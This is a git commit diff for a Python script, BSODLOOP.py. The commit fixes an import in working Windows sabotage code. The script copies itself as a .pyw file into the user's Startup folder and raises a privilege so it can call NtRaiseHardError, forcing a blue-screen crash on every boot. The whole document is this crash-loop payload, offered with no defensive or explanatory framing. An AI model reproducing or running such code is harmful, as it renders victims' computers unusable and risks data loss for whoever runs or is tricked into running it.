609f16c5666b15a6b93a23365e9f789c7bdcdf71
ybpytlmao <gamesgamesgamesforgames@gmail.com>
2024-10-05 14:46:25 +1300

    Update BSODLOOP.py

--- BSODLOOP.py
+++ BSODLOOP.py
@@ -1,4 +1,5 @@
 import ctypes
+import ctypes.wintypes
 import os
 
 startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -7,7 +8,7 @@ file_name = "!!!!!.pyw"
 file_path = os.path.join(startup_dir, file_name)
 
 with open(file_path, "w") as file:
-    file.write("import ctypes\nctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))\nctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))")
+    file.write("import ctypes\nimport ctypes.wintypes\nctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))\nctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))")
 
 ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
 ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
